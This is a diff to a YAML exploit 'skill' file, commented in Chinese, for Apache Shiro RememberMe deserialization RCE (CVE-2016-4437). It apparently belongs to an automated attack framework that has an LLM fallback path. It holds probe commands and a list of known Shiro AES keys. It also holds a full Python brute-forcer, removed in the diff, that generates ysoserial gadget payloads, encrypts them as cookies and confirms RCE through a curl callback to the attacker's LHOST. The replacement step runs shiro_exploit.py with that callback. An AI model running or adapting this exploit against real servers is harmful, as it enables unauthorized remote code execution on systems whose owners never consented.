@@ -1,44 +1,39 @@
 # ═══════════════════════════════════════════════════════════
-# Apache Shiro RememberMe 反序列化 RCE (CVE-2016-4437)
+# Apache Shiro RememberMe 反序列化 RCE (CVE-2016-4437) v4
 #
 # 原理: Shiro 用 AES 密钥加密 RememberMe Cookie 中的序列化对象
 #       攻击者用已知密钥 + ysoserial gadget 构造恶意 Cookie → RCE
-# 关键: JDK 8 运行 ysoserial（JDK 21 大部分 gadget 生成失败）
+#
+# v4 改进:
+#   - 回调检测替代 deleteMe 判断（deleteMe 机制不可靠）
+#   - shiro_exploit.py v2 内置回调爆破
+#   - Python AES 替代 Java 编译加密
+#   - JDK 8 只用于 ysoserial payload 生成
 # ═══════════════════════════════════════════════════════════
 skill_id: shiro_rce
 name: "Apache Shiro RememberMe 反序列化 RCE"
 category: java_deserialization
-version: "3.0"
+version: "4.0"
 
 principle: |
   Apache Shiro 的 RememberMe 功能使用 AES 加密序列化的用户身份信息。
-  
+
   漏洞根因：
   - Shiro 1.2.4 及更早版本使用硬编码 AES 密钥 kPH+bIxk5D2deZiIxcaaaA==
   - 大量项目使用了其他已知/泄露的密钥
-  
-  完整利用链：
-  1. 用 ysoserial（必须 JDK 8 运行）生成 gadget chain 序列化字节流
-  2. 随机 16 字节 IV
-  3. AES-CBC(key, IV, PKCS5Padding(serialized_payload)) 加密
-  4. Base64(IV + ciphertext) 编码
-  5. 设置为 rememberMe Cookie 发送
-  
-  密钥判定逻辑：
-  - 密钥错误 → 解密失败 → 返回 rememberMe=deleteMe
-  - 密钥正确但 gadget 不匹配 classpath → 反序列化异常 → 也返回 deleteMe
-  - 密钥正确且 gadget 匹配 → 正常处理（无 deleteMe）→ 命令被执行
-  
-  所以 "密钥是否正确" 不能只看 deleteMe，需要遍历 密钥×gadget 全组合。
-  
-  常见 gadget chain 及依赖：
-  - CommonsBeanutils1: 需要 commons-beanutils（Shiro 自带，最常命中）
-  - CommonsCollections1~6: 需要 commons-collections 3.x
-  - CommonsCollections7: 需要 commons-collections 3.x + JDK 8
-  
-  关键约束：ysoserial 必须用 JDK 8 运行。JDK 9+ 的模块系统导致
-  大部分 gadget 生成失败（CommonsBeanutils1、CC2 等全部报错）。
-  toolbox 环境变量 JAVA8 指向 JDK 8 路径。
+
+  检测难点（为什么不用 deleteMe 判断）：
+  - 密钥错误 → 解密失败 → 返回 deleteMe
+  - 密钥正确但 gadget 异常 → 反序列化抛异常 → 也返回 deleteMe
+  - CB1 gadget 执行命令是副作用，异常后 Shiro 仍设 deleteMe
+  - 所以 deleteMe 不能区分"密钥错误"和"密钥正确但 gadget 异常"
+
+  正确方法：网络回调检测
+  - 用 ysoserial 生成 "curl http://LHOST:PORT/shiro" payload
+  - AES 加密后发送，目标执行 curl 回连
+  - 监听器收到回调 = RCE 确认
+
+  关键约束：ysoserial 必须用 JDK 8 运行。
 
 match:
   rules:
@@ -61,47 +56,20 @@ probes:
       if echo "$response" | grep -qi "rememberMe=deleteMe"; then
         echo "SHIRO_CONFIRMED=true"
       fi
-      if echo "$response" | grep -qi "JSESSIONID\|Set-Cookie"; then
-        echo "HAS_SESSION=true"
-      fi
     timeout: 15
     parse_rules:
       - if_contains: ["SHIRO_CONFIRMED=true"]
         set: { shiro_confirmed: true }
-      - if_contains: ["HAS_SESSION=true"]
-        set: { has_session: true }
-
-  - id: detect_shiro_version
-    description: "通过 Cookie 行为推断 Shiro 版本（CBC vs GCM）"
-    depends_on: { shiro_confirmed: true }
-    steps:
-      - command: |
-          # CBC 模式: 短 payload 也会触发 deleteMe
-          # GCM 模式: 需要特定格式才触发
-          short_resp=$(curl -s -D - -o /dev/null {ENDPOINT} \
-            -H "Cookie: rememberMe=AAAAAAAAAAAAAAAAAAAAAA==" \
-            --max-time 10 2>&1)
-          if echo "$short_resp" | grep -qi "rememberMe=deleteMe"; then
-            echo "SHIRO_RESPONDED_DELETEME"
-          else
-            echo "SHIRO_NO_DELETEME_FOR_SHORT"
-          fi
-        parse_rules:
-          - if_contains: ["SHIRO_RESPONDED_DELETEME"]
-            set: { likely_cbc: true }
 
   - id: check_java8
-    description: "检查 toolbox 中 JDK 8 是否可用，记录路径"
+    description: "检查 toolbox 中 JDK 8 是否可用"
     depends_on: { shiro_confirmed: true }
     command: |
-      # 自动探测 JDK 8 路径（docker run 不读 /etc/profile.d）
       FOUND=""
       for p in \
         /usr/lib/jvm/java-8/bin/java \
         /usr/lib/jvm/java-8-openjdk-amd64/bin/java \
-        /usr/lib/jvm/java-1.8.0/bin/java \
         /usr/lib/jvm/temurin-8/bin/java \
-        /usr/lib/jvm/adoptopenjdk-8-hotspot-amd64/bin/java \
       ; do
         if [ -x "$p" ]; then
           ver=$($p -version 2>&1 | head -1)
@@ -120,263 +88,36 @@ probes:
         set: { java8_available: false }
 
 exploit_paths:
-  # ═══ 路径 A: shiro_exploit.py 一键脚本 ═══
-  - path_id: shiro_script
-    name: "shiro_exploit.py 一键利用"
+  # ═══ 路径 A: shiro_exploit.py v2 回调检测 ═══
+  - path_id: shiro_callback
+    name: "shiro_exploit.py 回调检测"
     priority: 1
     principle: |
-      使用预装脚本遍历密钥+gadget组合。
-      脚本需要用 JDK 8 运行 ysoserial。
+      使用 shiro_exploit.py 自动完成:
+      1. 用 JDK 8 + ysoserial 预生成各 gadget 的回调 payload
+      2. 启动 HTTP 回调监听器
+      3. 遍历 密钥×gadget 组合，发送加密 Cookie
+      4. 收到回调即确认 RCE
+
+      需要 LHOST 环境变量（攻击机公网 IP）和端口映射。
     conditions:
       shiro_confirmed: true
     steps:
-      - id: shiro_auto
-        description: "shiro_exploit.py 自动遍历"
-        command: "python3 /opt/shiro_exploit.py {ENDPOINT} id 2>&1"
-        timeout: 300
-        success_criteria:
-          stdout_contains_any: ["uid=", "SUCCESS", "gid="]
-        on_success: shiro_confirm
-        on_fail: next_path
-
-      - id: shiro_confirm
-        description: "确认 RCE 用户身份"
-        command: "python3 /opt/shiro_exploit.py {ENDPOINT} whoami 2>&1"
-        timeout: 120
-        success_criteria:
-          stdout_not_empty: true
-        on_success: conclude_success
-        evidence_capture:
-          current_user: stdout
-          shell_type: "rce_shiro_auto"
-
-  # ═══ 路径 B: JDK 8 回调检测暴破 ═══
-  - path_id: manual_jdk8_brute
-    name: "JDK 8 ysoserial 回调检测暴破"
-    priority: 2
-    principle: |
-      Java 的 Runtime.exec() 是非阻塞的——启动子进程后立即返回，不等待完成。
-      所以 "sleep 3" 不会导致 HTTP 响应延迟，延时盲注对 ysoserial 无效。
-
-      正确方法：网络回调检测
-      1. 在 toolbox 内启动一个临时 HTTP 监听器（nc）
-      2. 用 ysoserial 生成 "curl http://LHOST:PORT/confirm" 的 payload
-      3. AES-CBC 加密后作为 rememberMe Cookie 发送
-      4. 等几秒后检查监听器是否收到回调
-      5. 收到回调 = 密钥+gadget 正确 + RCE 确认
-
-      优先级：默认密钥 + CB1（Shiro 自带 commons-beanutils）排第一
-    conditions:
-      shiro_confirmed: true
-    steps:
-      - id: jdk8_callback_brute
-        description: "回调检测: curl 到 LHOST 确认 RCE（密钥 × gadget）"
+      - id: shiro_exploit
+        description: "回调检测爆破（密钥×gadget 自动遍历）"
         publish_ports: [39876]
         command: |
-          python3 << 'INNEREOF'
-          import subprocess, base64, os, sys, time, glob, socket, threading
-
-          TARGET = "{ENDPOINT}"
-          LHOST = os.getenv("LHOST", "")
-          YSOSERIAL = "/opt/ysoserial.jar"
-          CALLBACK_PORT = 39876
-
-          # 回调地址用 LHOST（宿主机 IP），端口通过 -p 映射到容器
-          # 目标 → curl LHOST:39876 → docker 端口映射 → 容器 0.0.0.0:39876
-          if not LHOST or LHOST.startswith("127."):
-              print("[!] LHOST 未设置或为 127.x，回调不可用")
-              print("ALL_COMBINATIONS_FAILED")
-              sys.exit(1)
-
-          CALLBACK_HOST = LHOST
-          print(f"[*] 回调地址: {CALLBACK_HOST}:{CALLBACK_PORT} (通过 docker -p 映射)")
-
-          # ── 自动探测 JDK 8 ──
-          JAVA8 = None
-          for p in [
-              "/usr/lib/jvm/java-8/bin/java",
-              "/usr/lib/jvm/java-8-openjdk-amd64/bin/java",
-          ] + glob.glob("/usr/lib/jvm/java-8*/bin/java"):
-              if os.path.isfile(p) and os.access(p, os.X_OK):
-                  JAVA8 = p
-                  break
-          if not JAVA8:
-              JAVA8 = os.getenv("JAVA8", "java")
-
-          KEYS = [
-              "kPH+bIxk5D2deZiIxcaaaA==",
-              "4AvVhmFLUs0KTA3Kprsdag==",
-              "3AvVhmFLUs0KTA3Kprsdag==",
-              "2AvVhdsgUs0FSA3SDFAdag==",
-              "Z3VucwAAAAAAAAAAAAAAAA==",
-              "wGiHplamyXlVB11UXWol8g==",
-              "fCq+/xW488hMTCD+cmJ3aQ==",
-              "1QWLxg+NYmxraMoxAXu/Iw==",
-              "L7RioUULEFhRyxM7a2R/Yg==",
-              "r0e3c16IdVkouZgk1TKVMg==",
-              "6ZmI6I2j5Y+R5aSn5ZOlAA==",
-              "5aaC5qKm5oqA5pyvAAAAAA==",
-              "bWicP0XBL7iLRfMSYSSZnQ==",
-              "WcfHGU25gNnTxTlmJMeSpw==",
-              "ClLk69oNcA3m+s0jIMIkpg==",
-              "Is9zJ3pzNh2cgTHB4ua3+Q==",
-              "U3ByaW5nQmxhZGUAAAAAAA==",
-              "R29vZCBsdWNrISEhISEhISE=",
-              "NsZXjXVklWPZwOfkvk6kUA==",
-              "GAevYnznvgNCURavBhCr1w==",
-              "aU1pcmFjbGVpTWlyYWNsZQ==",
-              "ZUdsaGJFshHKlBDbLRvSTw==",
-              "SDKOLKn2J1j/2BHjeZwAoQ==",
-              "tiVV6g3uZBGfhUGUzwIImQ==",
-              "cmVtZW1iZXJNZQAAAAAAAA==",
-              "66v1O8keKNV3TTcGPK1wzg==",
-              "bXRvbnMAAAAAAAAAAAAAAA==",
-              "a2VlcE9uR29pbmdBbmRGaQ==",
-              "Bf7MfkNR0axGGpZDB1bABw==",
-          ]
-
-          GADGETS = [
-              "CommonsBeanutils1",
-              "CommonsCollections2",
-              "CommonsCollections1",
-              "CommonsCollections6",
-              "CommonsCollections3",
-          ]
-
-          def validate_key(k):
-              try:
-                  return len(base64.b64decode(k)) == 16
-              except:
-                  return False
-
-          def aes_encrypt(key_b64, data):
-              try:
-                  from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-                  from cryptography.hazmat.primitives import padding as sym_padding
-                  key = base64.b64decode(key_b64)
-                  iv = os.urandom(16)
-                  padder = sym_padding.PKCS7(128).padder()
-                  padded = padder.update(data) + padder.finalize()
-                  cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
-                  enc = cipher.encryptor()
-                  ct = enc.update(padded) + enc.finalize()
-                  return base64.b64encode(iv + ct).decode()
-              except Exception as e:
-                  print(f"[!] 加密失败: {e}", file=sys.stderr)
-                  return None
-
-          def send_payload(target, cookie):
-              try:
-                  subprocess.run(
-                      ["curl", "-s", "-o", "/dev/null",
-                       target, "-H", f"Cookie: rememberMe={cookie}",
-                       "--max-time", "8"],
-                      capture_output=True, timeout=12
-                  )
-              except:
-                  pass
-
-          # ── 回调监听器 ──
-          callback_received = threading.Event()
-          callback_data = {}
-
-          def callback_listener(port, timeout=5):
-              """在指定端口监听回调，收到连接设置 event"""
-              try:
-                  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                  sock.settimeout(timeout)
-                  sock.bind(("0.0.0.0", port))
-                  sock.listen(1)
-                  conn, addr = sock.accept()
-                  data = conn.recv(1024)
-                  conn.sendall(b"HTTP/1.0 200 OK\r\n\r\nok")
-                  conn.close()
-                  sock.close()
-                  callback_data["from"] = addr
-                  callback_data["data"] = data.decode(errors="replace")[:200]
-                  callback_received.set()
-              except socket.timeout:
-                  sock.close()
-              except Exception as e:
-                  try: sock.close()
-                  except: pass
-
-          # ── 检查环境 ──
-          print(f"[*] JDK 8: {JAVA8}")
-          print(f"[*] 目标: {TARGET}")
-          print(f"[*] 回调地址: {CALLBACK_HOST}:{CALLBACK_PORT}")
-
-          valid_keys = [k for k in KEYS if validate_key(k)]
-          print(f"[*] 有效密钥: {len(valid_keys)}, Gadget: {len(GADGETS)}")
-          sys.stdout.flush()
-
-          # ── 逐个组合测试（每个组合启动临时监听器）──
-          total = len(valid_keys) * len(GADGETS)
-          tested = 0
-          found = False
-
-          for key in valid_keys:
-              if found:
-                  break
-              for gadget in GADGETS:
-                  tested += 1
-                  tag = f"shiro_{tested}"
-                  cmd = f"curl http://{CALLBACK_HOST}:{CALLBACK_PORT}/{tag}"
-
-                  # 生成 payload
-                  r = subprocess.run(
-                      [JAVA8, "-jar", YSOSERIAL, gadget, cmd],
-                      capture_output=True, timeout=15
-                  )
-                  if r.returncode != 0 or not r.stdout or len(r.stdout) < 100:
-                      continue
-
-                  cookie = aes_encrypt(key, r.stdout)
-                  if not cookie:
-                      continue
-
-                  # 启动回调监听
-                  callback_received.clear()
-                  listener = threading.Thread(
-                      target=callback_listener,
-                      args=(CALLBACK_PORT, 5),
-                      daemon=True
-                  )
-                  listener.start()
-                  time.sleep(0.2)  # 等监听器就绪
-
-                  # 发送 payload
-                  send_payload(TARGET, cookie)
-
-                  # 等待回调（最多 4 秒）
-                  listener.join(timeout=4)
-
-                  if callback_received.is_set():
-                      print(f"\n[!!!] CALLBACK_RCE_CONFIRMED")
-                      print(f"[!!!] KEY={key}")
-                      print(f"[!!!] GADGET={gadget}")
-                      print(f"[!!!] 回调来自: {callback_data.get('from', '?')}")
-                      found = True
-                      break
-
-                  if tested % 5 == 0:
-                      print(f"[*] 进度: {tested}/{total} ({key[:8]}...×{gadget})")
-                      sys.stdout.flush()
-
-          if not found:
-              print(f"\n[*] 全部 {tested} 个组合测试完毕，无回调")
-              print("ALL_COMBINATIONS_FAILED")
-          INNEREOF
-        timeout: 600
+          python3 /opt/shiro_exploit.py {ENDPOINT} \
+            --lhost "$LHOST" --port 39876
+        timeout: 420
         success_criteria:
-          stdout_contains_any: ["CALLBACK_RCE_CONFIRMED"]
+          stdout_contains_any: ["SHIRO_RCE_CONFIRMED"]
         on_success: conclude_success
         on_fail: next_path
         evidence_capture:
           shell_type: "rce_shiro_callback"
 
-  # ═══ 路径 C: LLM 兜底（严格限定在 Shiro 范围内）═══
+  # ═══ 路径 B: LLM 兜底 ═══
   - path_id: llm_freeform
     name: "LLM 自由推理（限定 Shiro 漏洞范围）"
     priority: 99
